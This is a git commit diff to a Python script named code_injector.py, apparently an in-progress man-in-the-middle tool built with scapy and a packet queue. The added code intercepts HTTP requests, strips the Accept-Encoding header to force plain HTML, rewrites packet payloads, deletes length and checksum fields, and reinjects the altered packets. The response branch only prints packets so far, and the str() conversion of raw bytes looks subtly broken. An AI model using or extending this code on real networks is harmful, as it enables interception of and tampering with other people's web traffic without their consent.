760c6c25bed83e7adc9151884b331a84603ce0a4
Avish Dhirawat <31956212+Avishdhirawat0@users.noreply.github.com>
2020-10-07 13:48:05 -0400

    Add files via upload

--- code_injector.py
+++ code_injector.py
@@ -21,6 +21,15 @@ def get_arguments(): # Function to get arguments in command line
     else:
         return options
 
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    # print scapy_packet.show()
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -29,9 +38,13 @@ def process_packet(packet):
             print("[+] HTTP Request ")
             # print(scapy_packet.show())
             # Substituting the Accept-Encoding part to get plain HTML Code
-            modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", str(scapy_packet[scapy.Raw].load))
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(bytes(new_packet))
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
+            print(scapy_packet.show())
     packet.accept()
 
 try:
